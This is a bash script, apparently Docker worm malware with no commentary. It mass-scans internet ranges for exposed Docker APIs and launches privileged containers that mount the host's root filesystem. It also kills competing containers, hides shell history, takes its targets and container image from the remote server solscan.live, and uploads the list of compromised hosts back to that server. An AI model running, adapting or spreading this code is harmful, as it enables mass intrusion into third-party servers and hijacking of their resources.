#!/bin/bash
unset HISTFILE
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games

function DOCKERGEDDON(){
    local THERANGE=$1
    local PORT=$2
    local SCANRATE=$3
    local PWNCONTI=$4
    local rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
    local IPADDYS

    IPADDYS=$(masscan $THERANGE -p$PORT --rate=$SCANRATE | awk '{print $6}' | zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)

    for IPADDY in $IPADDYS
    do
        echo "$IPADDY:$PORT"
        echo "$IPADDY:$PORT" >> /tmp/out.txt
        timeout -s SIGKILL 30 docker -H $IPADDY:$PORT info >> /tmp/check.txt 2>/dev/null
        local HE_SAY=$?
        echo $HE_SAY
        if [ "$HE_SAY" -eq 0 ]; then
            local DONTINF="no"
            local RAM=$(grep "Total Memory" /tmp/check.txt | awk '{print $3}')
            local ARCHITEC=$(grep Architecture /tmp/check.txt | awk '{print $2}')
            if [ "$RAM" = "31.42GiB" ]; then DONTINF="yes" ; echo -e "\e[1;33;41m Friendly FU!!! \033[0m"; fi
            if [ "$ARCHITEC" != "x86_64" ] ; then DONTINF="yes" ; echo -e "\e[1;33;41m NOT OYR Plattform!!! \033[0m"; fi
            if [ "$DONTINF" = "no" ]; then
                timeout -s SIGKILL 120 docker -H $IPADDY:$PORT run -d --name smallV2 --privileged --net host -v /:/host $PWNCONTI
                HE_SAY=$?
                echo $HE_SAY
                if [ "$HE_SAY" -eq 0 ]; then
                    local OLDCONTI=$(docker -H $IPADDY:$PORT ps | grep -v "smallV2" | grep "upspin" | awk '{print $1}')
                    if [ ! -z "$OLDCONTI" ]; then docker -H $IPADDY:$PORT stop $OLDCONTI ; fi
                fi
            fi
        fi
        rm -f /tmp/check.txt
    done
}

while true
do
    CONTAINER=$(curl -s http://solscan.live/data/docker.container.local.spread.txt || echo "nmlmweb3/upspin")
    SRATE=$(curl -s http://solscan.live/range/d_rate.txt || echo "100000")
    RANGE=$(curl -s http://solscan.live/range/d.php)
    RANGETOSCAN=${RANGE}.0/8
    RANGETOSCAN=${RANGETOSCAN:-$(($RANDOM%255+1)).0/8}
    
    for PORT in 2375 2376 2377 4244 4243
    do
        DOCKERGEDDON $RANGETOSCAN $PORT $SRATE $CONTAINER
        if [ -f "/tmp/out.txt" ]; then
            curl -F "userfile=@/tmp/out.txt" http://solscan.live/results/d.php
            rm -f /tmp/out.txt
        fi
    done
done
